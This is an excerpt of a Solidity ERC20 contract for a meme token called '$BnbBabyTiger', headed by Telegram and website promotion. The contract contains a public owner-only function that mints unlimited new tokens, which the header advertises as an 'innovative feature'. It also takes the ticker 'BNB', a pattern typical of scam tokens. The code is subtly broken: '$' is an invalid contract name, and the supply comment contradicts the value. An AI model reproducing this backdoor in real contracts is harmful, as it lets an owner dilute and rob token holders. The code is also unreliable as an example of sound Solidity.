//
// $BnbBabyTiger proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BNBbaby_tiger
// 📱 Websiter::https://bnbbabytiger.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BnbBabyTiger(uint256 amount) public onlyOwner {
 _BnbBabyTiger(msg.sender, amount);
    }
    ...
    function _BnbBabyTiger(address account, uint256 amount) internal virtual {
...
contract $BnbBabyTiger is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Bnb Baby Tiger", "BNB") {
     _BnbBabyTiger(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}